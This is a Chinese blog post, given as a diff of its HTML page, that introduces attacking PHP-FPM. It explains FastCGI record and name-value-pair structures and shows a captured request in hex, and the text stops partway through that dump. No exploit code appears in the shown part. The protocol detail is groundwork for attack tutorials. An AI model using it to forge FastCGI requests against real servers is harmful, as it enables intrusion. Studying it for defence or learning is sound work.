@@ -1,0 +1,635 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>攻击PHP-FPM - Hexo</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="Nginx与PHP-FPMNginx​	Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。 PHP-FPM​	FPM（php-Fastcgi Process Manager）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。故名思义,FPM是管理FastCGI进程的,能够解析f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击PHP-FPM">
+<meta property="og:url" content="http://m1racle20.github.io/2024/09/27/%E6%94%BB%E5%87%BBPHP-FPM/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Nginx与PHP-FPMNginx​	Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。 PHP-FPM​	FPM（php-Fastcgi Process Manager）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。故名思义,FPM是管理FastCGI进程的,能够解析f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240911132052.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240913085111.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240918150310.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240918192134.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240921191659.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240922140138.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240922211139.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240922211200.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/tuchuang/20240924220216.png">
+<meta property="og:image" content="https://gitee.com/m1race/tuchuang/tuchuang/20240924220152.png">
+<meta property="article:published_time" content="2024-09-27T02:59:24.811Z">
+<meta property="article:modified_time" content="2024-09-27T03:04:28.416Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240911132052.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1727706340886">
+
+<link rel="stylesheet" href="/css/style.css?v=1727706340886">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1727706340886">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1727706340887"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="John Doe"><img src="https://gitee.com/m1race/tuchuang/blob/master/image/1223331.jpg" alt="John Doe"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="John Doe">
+            <img src="https://gitee.com/m1race/tuchuang/blob/master/image/1223331.jpg" alt="John Doe" alt="John Doe">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>2</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://i.nexmoe.com/" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/09/27/%E6%94%BB%E5%87%BBPHP-FPM/">攻击PHP-FPM</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/02/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://nexmoe.com/" target="_blank" >
+                    <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="折影轻梦"></img>
+                    <p>折影轻梦</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2024 John Doe
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">鄂ICP备2020018486号</a>
+<br><a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">
+<img src="https://i.dawnlab.me/c0268c1e6cfd0863d6ba35be1575941a.png" width="150px"></a>
+
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png" alt="攻击PHP-FPM" loading="lazy">
+            <h1>攻击PHP-FPM</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2024年09月27日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Nginx与PHP-FPM"><a href="#Nginx与PHP-FPM" class="headerlink" title="Nginx与PHP-FPM"></a>Nginx与PHP-FPM</h1><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>​	Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。</p>
+<h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>​	FPM（php-Fastcgi Process Manager）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。故名思义,FPM是<strong>管理FastCGI进程</strong>的,能够解析fastcgi协议。</p>
+<p>​	其包含master和worker两种进程.master进程只有一个,负责监听端口,用来接收来自Web Sever请求,而worker进程一般会有多个,每个进程内部都嵌入了一个PHP解释器,是php真正执行的地方.</p>
+<p>  php-fpm默认是unix socket连接,可以在配置文件中修改成tcp连接</p>
+<h2 id="Nginx与PHP-FPM通信"><a href="#Nginx与PHP-FPM通信" class="headerlink" title="Nginx与PHP-FPM通信"></a>Nginx与PHP-FPM通信</h2><p>Nginx通过反向代理将请求转给PHP-FPM解析.</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240911132052.png" alt="image" data-caption="image" loading="lazy"></p>
+<h1 id="CGI与FastCGI"><a href="#CGI与FastCGI" class="headerlink" title="CGI与FastCGI"></a>CGI与FastCGI</h1><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>​	CGI（Common Gateway Interface）通用网关接口,在CGI模式下,当web服务器收到http请求时,就会调用php-cgi进程,通过CGI协议,服务器把请求内容转换成php-cgi能够读懂的协议数据传递给CGI进程,CGI进程拿到内容后就会解析对应的php文件,得到结果在返回给web服务器,由web服务器再返回给客户端.</p>
+<p>​	但是在CGI模式下,每次客户端发起请求都需要建立和销毁进程,导致资源消耗很大.因为http要生成一个动态页面,系统就必须启动一个新进程以运行CGI程序,不断地fork是一项很耗时间和资源的工作,所以诞生了FastCGI模式.</p>
+<h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p>​	FastCGI (Fast Common Gateway Interface)快速通用网关接口.FastCGi致力于减少网页服务器与CGI程序之间交互的开销,FastCGI每次处理完请求后,不会kill掉这个进程,而是保留进程,从而使服务器可以同时处理更多的网页请求.</p>
+<p>​	简而言之，CGI模式是Apache2接收到请求去调用CGI程序，而FastCGI模式是FastCGI进程自己管理自己的CGI进程，而不再是Apache去主动调用CGI进程，而FastCGI进程又提供了很多辅助功能比如内存管理、垃圾处理、保障了CGI的高效性，并且此时CGI是常驻在内存中、不会每次请求重新启动，从而使得性能得到质的提高.</p>
+<h1 id="FastCGI协议分析"><a href="#FastCGI协议分析" class="headerlink" title="FastCGI协议分析"></a>FastCGI协议分析</h1><p> <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016901718">Tcpdump抓包Nginx中FastCGI协议</a></p>
+<h2 id="Fastcgi-record"><a href="#Fastcgi-record" class="headerlink" title="Fastcgi record"></a>Fastcgi record</h2><p>​	FastCGI是一个通信协议,和HTTP协议一样,都是进行数据交换的一个通道.</p>
+<p>​	类比HTTP协议来说,fastcgi协议是服务器中间件和摸个语言后端进行数据交换的协议.fastcgi协议由多个<strong>record</strong>组成,record也有<strong>header</strong>和<strong>body</strong>,服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端,语言后端解码后得到具体数据,进行指定操作,并将结果在按照该协议封装好后返回给服务器中间件.</p>
+<p>​	和HTTP头不同的是,record的头固定8个字节,body是由头中的contentLength指定,结构如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  /* Header */</span><br><span class="line">  unsigned char version; // 版本</span><br><span class="line">  unsigned char type; // 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>
+
+<p>​	Header头由8个uchar类型的变量组成,每个变量1字节.其中,<strong>requestld</strong>占两个字节,一个是唯一的标志id,用来避免多个请求之间的影响;<strong>contenLength</strong>占两个字节,表示body的大小.</p>
+<p>​	在语言端解析了fastcgi头以后,拿到contentLength,然后再在TCP流中读取大小等于contentLenth的数据,这就是body体.</p>
+<p>​	body后面还以一段额外的数据Padding,其中长度由头中的paddingLength指定,起保留作用.不需要该Padding的时候,将其长度设置为0即可</p>
+<p>由此可见,一个fastcgi的record结构最大支持的body大小是2^16,65536字节.</p>
+<h2 id="Fastcgi-type"><a href="#Fastcgi-type" class="headerlink" title="Fastcgi type"></a>Fastcgi type</h2><p>​	现在再来详细介绍一下fastcgi record中的<strong>type</strong>字节.</p>
+<p>​	<strong>type就是指定该record的作用</strong>.因为fastcgi的一个record的大小是有限的,作用也是单一的,所以我们需要在一个TCP流中传输多个record,<strong>通过type来标志每个record的作用</strong>,用requestid作为同义词请求的id.</p>
+<p>​	所以在一次请求中，多个record的requestid是相同的。</p>
+<p>type值的具体含义：</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240913085111.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>​	看到这个图我们可以知道，在服务器中间件与后端交互时，第一个数据包record的type&#x3D;1，之后继续交互发送type&#x3D;4,5,6,7的record,结束时发送type&#x3D;2,3的record.</p>
+<p>当后端语言接收到一个type为4的record后，就会把这个record的body按照对应结构解析成key-value对，这就是php的<strong>环境变量</strong>，其结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>
+
+<p>这其实是 4 个结构，至于用哪个结构，有如下规则：</p>
+<ol>
+<li>key、value均小于128字节，用 FCGI_NameValuePair11</li>
+<li>key大于128字节，value小于128字节，用 FCGI_NameValuePair41</li>
+<li>key小于128字节，value大于128字节，用 FCGI_NameValuePair14</li>
+<li>key、value均大于128字节，用 FCGI_NameValuePair44</li>
+</ol>
+<h2 id="抓包流量分析"><a href="#抓包流量分析" class="headerlink" title="抓包流量分析"></a>抓包流量分析</h2><p>使用tcpdump抓取端口9000的包,追踪其tcp流:</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://gitee.com/m1race/tuchuang/raw/master/tuchuang/20240918150310.png" alt="image-20240918150308863" data-caption="image-20240918150308863" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">00000000  01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000010  01 04 00 01 05 47 01 00  0c 00 51 55 45 52 59 5f   .....G.. ..QUERY_</span><br><span class="line">00000020  53 54 52 49 4e 47 0e 04  52 45 51 55 45 53 54 5f   STRING.. REQUEST_</span><br><span class="line">00000030  4d 45 54 48 4f 44 50 4f  53 54 0c 21 43 4f 4e 54   METHODPO ST.!CONT</span><br><span class="line">00000040  45 4e 54 5f 54 59 50 45  61 70 70 6c 69 63 61 74   ENT_TYPE applicat</span><br><span class="line">00000050  69 6f 6e 2f 78 2d 77 77  77 2d 66 6f 72 6d 2d 75   ion/x-ww w-form-u</span><br><span class="line">00000060  72 6c 65 6e 63 6f 64 65  64 0e 01 43 4f 4e 54 45   rlencode d..CONTE</span><br><span class="line">00000070  4e 54 5f 4c 45 4e 47 54  48 33 0b 06 53 43 52 49   NT_LENGT H3..SCRI</span><br><span class="line">00000080  50 54 5f 4e 41 4d 45 2f  31 2e 70 68 70 0b 06 52   PT_NAME/ 1.php..R</span><br><span class="line">00000090  45 51 55 45 53 54 5f 55  52 49 2f 31 2e 70 68 70   EQUEST_U RI/1.php</span><br><span class="line">000000A0  0c 06 44 4f 43 55 4d 45  4e 54 5f 55 52 49 2f 31   ..DOCUME NT_URI/1</span><br><span class="line">000000B0  2e 70 68 70 0d 0d 44 4f  43 55 4d 45 4e 54 5f 52   .php..DO CUMENT_R</span><br><span class="line">000000C0  4f 4f 54 2f 76 61 72 2f  77 77 77 2f 68 74 6d 6c   OOT/var/ www/html</span><br><span class="line">000000D0  0f 08 53 45 52 56 45 52  5f 50 52 4f 54 4f 43 4f   ..SERVER _PROTOCO</span><br><span class="line">000000E0  4c 48 54 54 50 2f 31 2e  31 0e 04 52 45 51 55 45   LHTTP/1. 1..REQUE</span><br><span class="line">000000F0  53 54 5f 53 43 48 45 4d  45 68 74 74 70 11 07 47   ST_SCHEM Ehttp..G</span><br><span class="line">00000100  41 54 45 57 41 59 5f 49  4e 54 45 52 46 41 43 45   ATEWAY_I NTERFACE</span><br><span class="line">00000110  43 47 49 2f 31 2e 31 0f  0c 53 45 52 56 45 52 5f   CGI/1.1. .SERVER_</span><br><span class="line">00000120  53 4f 46 54 57 41 52 45  6e 67 69 6e 78 2f 31 2e   SOFTWARE nginx/1.</span><br><span class="line">00000130  32 30 2e 32 0b 0c 52 45  4d 4f 54 45 5f 41 44 44   20.2..RE MOTE_ADD</span><br><span class="line">00000140  52 31 39 32 2e 31 36 38  2e 32 30 2e 31 0b 05 52   R192.168 .20.1..R</span><br><span class="line">00000150  45 4d 4f 54 45 5f 50 4f  52 54 36 34 32 35 36 0b   EMOTE_PO RT64256.</span><br><span class="line">00000160  0a 53 45 52 56 45 52 5f  41 44 44 52 31 37 32 2e   .SERVER_ ADDR172.</span><br><span class="line">00000170  31 37 2e 30 2e 32 0b 02  53 45 52 56 45 52 5f 50   17.0.2.. SERVER_P</span><br><span class="line">00000180  4f 52 54 38 30 0b 09 53  45 52 56 45 52 5f 4e 41   ORT80..S ERVER_NA</span><br><span class="line">00000190  4d 45 6c 6f 63 61 6c 68  6f 73 74 0f 03 52 45 44   MElocalh ost..RED</span><br><span class="line">000001A0  49 52 45 43 54 5f 53 54  41 54 55 53 32 30 30 0f   IRECT_ST ATUS200.</span><br><span class="line">000001B0  13 53 43 52 49 50 54 5f  46 49 4c 45 4e 41 4d 45   .SCRIPT_ FILENAME</span><br><span class="line">000001C0  2f 76 61 72 2f 77 77 77  2f 68 74 6d 6c 2f 31 2e   /var/www /html/1.</span><br><span class="line">000001D0  70 68 70 09 0e 48 54 54  50 5f 48 4f 53 54 31 39   php..HTT P_HOST19</span><br><span class="line">000001E0  32 2e 31 36 38 2e 32 30  2e 31 32 39 0f 0a 48 54   2.168.20 .129..HT</span><br><span class="line">000001F0  54 50 5f 43 4f 4e 4e 45  43 54 49 4f 4e 6b 65 65   TP_CONNE CTIONkee</span><br><span class="line">00000200  70 2d 61 6c 69 76 65 13  01 48 54 54 50 5f 43 4f   p-alive. .HTTP_CO</span><br><span class="line">00000210  4e 54 45 4e 54 5f 4c 45  4e 47 54 48 33 0b 08 48   NTENT_LE NGTH3..H</span><br><span class="line">00000220  54 54 50 5f 50 52 41 47  4d 41 6e 6f 2d 63 61 63   TTP_PRAG MAno-cac</span><br><span class="line">00000230  68 65 12 08 48 54 54 50  5f 43 41 43 48 45 5f 43   he..HTTP _CACHE_C</span><br><span class="line">00000240  4f 4e 54 52 4f 4c 6e 6f  2d 63 61 63 68 65 1e 01   ONTROLno -cache..</span><br><span class="line">00000250  48 54 54 50 5f 55 50 47  52 41 44 45 5f 49 4e 53   HTTP_UPG RADE_INS</span><br><span class="line">00000260  45 43 55 52 45 5f 52 45  51 55 45 53 54 53 31 0b   ECURE_RE QUESTS1.</span><br><span class="line">00000270  15 48 54 54 50 5f 4f 52  49 47 49 4e 68 74 74 70   .HTTP_OR IGINhttp</span><br><span class="line">00000280  3a 2f 2f 31 39 32 2e 31  36 38 2e 32 30 2e 31 32   ://192.1 68.20.12</span><br><span class="line">00000290  39 11 21 48 54 54 50 5f  43 4f 4e 54 45 4e 54 5f   9.!HTTP_ CONTENT_</span><br><span class="line">000002A0  54 59 50 45 61 70 70 6c  69 63 61 74 69 6f 6e 2f   TYPEappl ication/</span><br><span class="line">000002B0  78 2d 77 77 77 2d 66 6f  72 6d 2d 75 72 6c 65 6e   x-www-fo rm-urlen</span><br><span class="line">000002C0  63 6f 64 65 64 0f 6f 48  54 54 50 5f 55 53 45 52   coded.oH TTP_USER</span><br><span class="line">000002D0  5f 41 47 45 4e 54 4d 6f  7a 69 6c 6c 61 2f 35 2e   _AGENTMo zilla/5.</span><br><span class="line">000002E0  30 20 28 57 69 6e 64 6f  77 73 20 4e 54 20 31 30   0 (Windo ws NT 10</span><br><span class="line">000002F0  2e 30 3b 20 57 69 6e 36  34 3b 20 78 36 34 29 20   .0; Win6 4; x64) </span><br><span class="line">00000300  41 70 70 6c 65 57 65 62  4b 69 74 2f 35 33 37 2e   AppleWeb Kit/537.</span><br><span class="line">00000310  33 36 20 28 4b 48 54 4d  4c 2c 20 6c 69 6b 65 20   36 (KHTM L, like </span><br><span class="line">00000320  47 65 63 6b 6f 29 20 43  68 72 6f 6d 65 2f 31 32   Gecko) C hrome/12</span><br><span class="line">00000330  38 2e 30 2e 30 2e 30 20  53 61 66 61 72 69 2f 35   8.0.0.0  Safari/5</span><br><span class="line">00000340  33 37 2e 33 36 0b 80 00  00 87 48 54 54 50 5f 41   37.36... ..HTTP_A</span><br><span class="line">00000350  43 43 45 50 54 74 65 78  74 2f 68 74 6d 6c 2c 61   CCEPTtex t/html,a</span><br><span class="line">00000360  70 70 6c 69 63 61 74 69  6f 6e 2f 78 68 74 6d 6c   pplicati on/xhtml</span><br><span class="line">00000370  2b 78 6d 6c 2c 61 70 70  6c 69 63 61 74 69 6f 6e   +xml,app lication</span><br><span class="line">00000380  2f 78 6d 6c 3b 71 3d 30  2e 39 2c 69 6d 61 67 65   /xml;q=0 .9,image</span><br><span class="line">00000390  2f 61 76 69 66 2c 69 6d  61 67 65 2f 77 65 62 70   /avif,im age/webp</span><br><span class="line">000003A0  2c 69 6d 61 67 65 2f 61  70 6e 67 2c 2a 2f 2a 3b   ,image/a png,*/*;</span><br><span class="line">000003B0  71 3d 30 2e 38 2c 61 70  70 6c 69 63 61 74 69 6f   q=0.8,ap plicatio</span><br><span class="line">000003C0  6e 2f 73 69 67 6e 65 64  2d 65 78 63 68 61 6e 67   n/signed -exchang</span><br><span class="line">000003D0  65 3b 76 3d 62 33 3b 71  3d 30 2e 37 0c 1b 48 54   e;v=b3;q =0.7..HT</span><br><span class="line">000003E0  54 50 5f 52 45 46 45 52  45 52 68 74 74 70 3a 2f   TP_REFER ERhttp:/</span><br><span class="line">000003F0  2f 31 39 32 2e 31 36 38  2e 32 30 2e 31 32 39 2f   /192.168 